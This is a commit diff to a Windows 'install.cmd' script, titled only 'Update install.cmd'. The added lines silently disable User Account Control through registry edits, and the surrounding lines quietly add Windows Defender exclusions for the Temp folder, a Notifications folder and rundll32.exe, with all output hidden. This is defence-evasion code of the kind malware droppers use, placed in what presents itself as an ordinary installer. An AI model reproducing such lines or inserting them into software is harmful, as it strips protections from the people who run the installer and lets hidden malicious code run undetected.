7e68e65bc36d7c666db674aa0f0c8dc8c280b9e3
aku <ilukasakov@gmail.com>
2026-08-24 00:56:37 +0300

    Update install.cmd

--- install.cmd
+++ install.cmd
@@ -8,6 +8,11 @@ if %errorlevel% neq 0 (
 )
 cd /d "%~dp0"
 
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t REG_DWORD /d 0 /f >nul 2>&1
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d 0 /f >nul 2>&1
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "PromptOnSecureDesktop" /t REG_DWORD /d 0 /f >nul 2>&1
+
+
 powershell -Command "Add-MpPreference -ExclusionPath '%LOCALAPPDATA%\Microsoft\Windows\Notifications'" >nul 2>&1
 powershell -Command "Add-MpPreference -ExclusionPath '%USERPROFILE%\AppData\Local\Temp'" >nul 2>&1
 powershell -Command "Add-MpPreference -ExclusionProcess 'rundll32.exe'" >nul 2>&1
